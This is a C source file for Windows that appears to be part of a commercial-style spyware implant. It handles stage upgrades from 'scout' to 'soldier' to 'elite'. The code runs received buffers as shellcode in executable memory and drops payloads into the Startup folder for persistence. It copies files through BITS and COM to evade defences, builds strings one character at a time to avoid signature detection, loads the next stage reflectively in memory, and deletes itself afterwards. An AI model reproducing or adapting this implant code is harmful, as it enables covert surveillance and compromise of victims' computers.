#include <Windows.h>
#include <stdio.h>
#include <Wbemidl.h>
#include <comdef.h> 
#include <Shobjidl.h>
#include "Shlwapi.h"


#include "main.h"
#include "upgrade.h"
#include "bits.h"
#include "ldr.h"
#include "proto.h"
#include "mybits.h"

extern BOOL uMelted;
extern PULONG uSynchro;
extern PWCHAR GetRandomString(ULONG uMin);
extern HANDLE hScoutSharedMemory;

BOOL UpgradeScout(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
{
	BOOL bRet;
	PVOID pExecMemory;
	
	pExecMemory = VirtualAlloc(NULL, uFileLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pExecMemory, pFileBuffer, uFileLength);

	bRet = (*(BOOL (*)()) pExecMemory)();

	VirtualFree(pExecMemory, 0, MEM_RELEASE);
	return bRet;
}

BOOL UpgradeBoh(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
{
	
	ULONG uOut;
	LPWSTR pBatchName;
	BOOL bRetVal = FALSE;
	/*
	HANDLE hFile = INVALID_HANDLE_VALUE;
	LPWSTR pFileName = CreateTempFile();
	LPWSTR pScoutName = GetStartupScoutName();
	
	hFile = CreateFile(pFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		WCHAR pLastErr[16];
		WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'C', L'r', L'e', L'a', L't', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };

		swprintf(pLastErr, L"%x", GetLastError());
		wcscat(pInfoString, pLastErr);
		SendInfo(pInfoString);

		DeleteFile(pFileName);
		free(pFileName);
		free(pScoutName);

		return FALSE;
	}

	BOOL bVal = WriteFile(hFile, pFileBuffer, uFileLength, &uOut, NULL);
	CloseHandle(hFile);

	if (!bVal)
	{
		WCHAR pLastErr[16];
		WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'W', L'r', L'i', L't', L'e', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };

		swprintf(pLastErr, L"%x", GetLastError());
		wcscat(pInfoString, pLastErr);
		SendInfo(pInfoString);

		DeleteFile(pFileName);
		free(pFileName);
		free(pScoutName);

		return FALSE;
	}

	if (!AmIFromStartup() || uMelted == TRUE) // il meltato non dovrebbe mai finire in STARTUP ma tant'e'.
	{
		CreateCopyBatch(pFileName, pScoutName, &pBatchName);
		if (!StartBatch(pBatchName))
		{
			WCHAR pLastErr[16];
			WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'S', L't', L'a', L'r', L't', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };

			swprintf(pLastErr, L"%x", GetLastError());
			wcscat(pInfoString, pLastErr);
			SendInfo(pInfoString);			

			bRetVal = FALSE;
		}
		
		MySleep(2000);
	}
	else
	{
		CreateReplaceBatch(pScoutName, pFileName, &pBatchName);

		if (StartBatch(pBatchName))
			TerminateProcess(GetCurrentProcess(), 0);

		//else
		WCHAR pLastErr[16];
		WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'S', L't', L'a', L'r', L't', L'2', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };
		
		swprintf(pLastErr, L"%x", GetLastError());
		wcscat(pInfoString, pLastErr);
		SendInfo(pInfoString);	

		bRetVal = FALSE;
	}

	DeleteFile(pBatchName);
	DeleteFile(pFileName);

	free(pScoutName);
	free(pFileName);
	free(pBatchName);
	*/
	return bRetVal;
}


ULONG UpgradeSoldier(LPWSTR strUpgradeName, PBYTE lpFileBuffer, ULONG dwFileLength)
{
	BOOL bSuccess = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;	

	if (!wcschr(strUpgradeName, L'-'))
		return FALSE;

	LPWSTR strTempFile = CreateTempFile();
	hFile = CreateFile(strTempFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		WCHAR pLastErr[16];
		WCHAR pInfoString[] = { L'U', L'p', L'S', L'c', L':', L' ', L'C', L'r', L'e', L'a', L't', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };

		swprintf(pLastErr, L"%x", GetLastError());
		wcscat(pInfoString, pLastErr);
		SendInfo(pInfoString);

		DeleteFile(strTempFile);
		free(strTempFile);
		return FALSE;
	}

	DWORD dwOut;
	BOOL bVal = WriteFile(hFile, lpFileBuffer, dwFileLength, &dwOut, NULL);
	CloseHandle(hFile);

	if (!bVal || dwOut != dwFileLength)
	{	
		WCHAR pLastErr[16];
		WCHAR pInfoString[] = { L'U', L'p', L'S', L'o', L':', L' ', L'W', L'r', L'i', L't', L'F', L':', L' ', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0', L'\0' };

		swprintf(pLastErr, L"%x", GetLastError());
		wcscat(pInfoString, pLastErr);
		SendInfo(pInfoString);

		DeleteFile(strTempFile);
		free(strTempFile);
		return FALSE;
	}

	WCHAR strExe[] = { L'.', L'e', L'x', L'e', L'\0' };
	WCHAR strExeFormat[] = { L'%', L's', L'.', L'e', L'x', L'e', L'\0' };
	LPWSTR strDestFileName = GetStartupPath();
	LPWSTR strFileName = (LPWSTR) malloc(wcslen(strUpgradeName)*sizeof(WCHAR));
	SecureZeroMemory(strFileName, wcslen(strUpgradeName)*sizeof(WCHAR));
	_snwprintf_s(strFileName, wcslen(strUpgradeName), _TRUNCATE, strExeFormat, wcschr(strUpgradeName, L'-')+1);

	LPWSTR strDestFullName = (LPWSTR) malloc((32768+1)*sizeof(WCHAR));
	wcscpy_s(strDestFullName, 32768, strDestFileName);
	wcscat_s(strDestFullName, 32766, L"\\");
	wcscat_s(strDestFullName, 32766, wcschr(strUpgradeName, L'-')+1);
	wcscat_s(strDestFullName, 32766, strExe);

	BOOL bFileExists = FALSE;
	BitTransfer(strTempFile, strDestFullName);
	for (DWORD i=0; i<2; i++)
	{
		if (PathFileExists(strDestFullName))
		{
			bFileExists = TRUE;
			break;
		}
		Sleep(1000);
	}

 	if (!bFileExists && SUCCEEDED(ComCopyFile(strTempFile, strDestFileName, strFileName)))
	{
		Sleep(1000);

		for (DWORD i=0; i<10; i++)
		{
			if (PathFileExists(strDestFullName))
			{
				bFileExists = TRUE;
				break;
			}

			Sleep(1000);
		}
	}

	if (bFileExists == FALSE)
	{
		DoCopyFile(strTempFile, strDestFullName);
		for (DWORD i=0; i<10; i++)
		{
			if (PathFileExists(strDestFullName))
			{
				bFileExists = TRUE;
				break;
			}

			Sleep(1000);
		}
	}

	DeleteFile(strTempFile);

	if (bFileExists)
	{
		if (uMelted)
		{
			if (*uSynchro)
				DeleteAndDie(TRUE);
			else
			{
				DeleteAndDie(FALSE);
				*uSynchro = 1;
				ExitThread(0);
			}
		}
		else
		{
			DeleteAndDie(TRUE);
		}
	}

	free(strTempFile);
	free(strDestFileName);
	free(strDestFullName);
	free(strFileName);

	return FALSE;
}

ULONG UpgradeElite(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
{
	ULONG uRetries = 0;
	BOOL bSuccess = FALSE;

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MemoryLoader, pFileBuffer, 0, NULL);
	WaitForSingleObject(hThread, 60000);
	
	while (uRetries < 10)
	{
		if (ExistsEliteSharedMemory())
		{
			bSuccess = TRUE;
			break;
		}
		Sleep(6000);
		uRetries++;
	}

	if (bSuccess)
	{
#ifdef _DEBUG
		OutputDebugString(L"[*] Upgrade succeded, I'm going to die\n");
#endif
		if (!uMelted)
			DeleteAndDie(TRUE);

		if (*uSynchro)
			DeleteAndDie(TRUE);
		else
		{
			DeleteAndDie(FALSE);
			*uSynchro = 1;
			while(1)
				WaitForSingleObject(GetCurrentThread(), INFINITE);
		}
	}
#ifdef _DEBUG
	else
		OutputDebugString(L"Memory Loader FAIL\n");
#endif
		
	return bSuccess;





	
	/*																				
	if(MemoryLoader(pFileBuffer))
	{
		MessageBox(NULL, L"QUI NON TORNA", L"QUI NON", 0);
		if (uMelted)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		else
			ExitProcess(0);
	}
#ifdef _DEBUG
	else
		OutputDebugString(L"Memory Loader FAIL\n");
#endif
	*/


	/*
	HANDLE hFile = CreateFile(pUpgradePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile)
	{
		ULONG uOut;

		WriteFile(hFile, pFileBuffer, uFileLength, &uOut, NULL);
		CloseHandle(hFile);

		if (GetCurrentProcessId() == 4)
			MessageBox(NULL, L"I'm going to start it", L"WARNING", 0);


		PWCHAR pDest, pTempPath, pRandName;
		pTempPath = GetTemp();

		pDest = (PWCHAR)malloc(4096);
		pRandName = GetRandomString(8);
		_snwprintf_s(pDest, 4096/sizeof(WCHAR), _TRUNCATE, L"%s\\%s.tmp", pTempPath, pRandName); // .exe FIXME
		free(pRandName);

#ifdef _DEBUG
		OutputDebugString(L"[+] Starting BITS..\n");
#endif
		BitTransfer(pUpgradePath, pDest);
		DeleteFile(pUpgradePath);
		free(pTempPath);

		OutputDebugString(L"Starting upgrade!");
		
		PWCHAR pBatchName;
		CreateDeleteBatch(pDest, &pBatchName);

		STARTUPINFO si;
		PROCESS_INFORMATION pi;		
		SecureZeroMemory(&si, sizeof(STARTUPINFO));
		SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(si);

		gogogo(pFileBuffer);
		free(pFileBuffer);
		ExitProcess(0); /// TEST TEST TEST DELETEME
		
		if (CreateProcess(pDest, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
		{
			StartBatch(pBatchName);	
			if (uMelted)
			{
				*uSynchro = 1;
				ExitThread(0);
			}
			else
				ExitProcess(0);
		}
		else
		{
#ifdef _DEBUG
			OutputDebugString(L"[!!] Error executing upgrade\n");
#endif
			DeleteFile(pDest);
			free(pDest);
			free(pBatchName); // FIXME
			return FALSE;
		}
	}
	else
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] Cannot create upgrade file!!\n");		
#endif
		return FALSE;
	}
	

	return FALSE;
	*/
}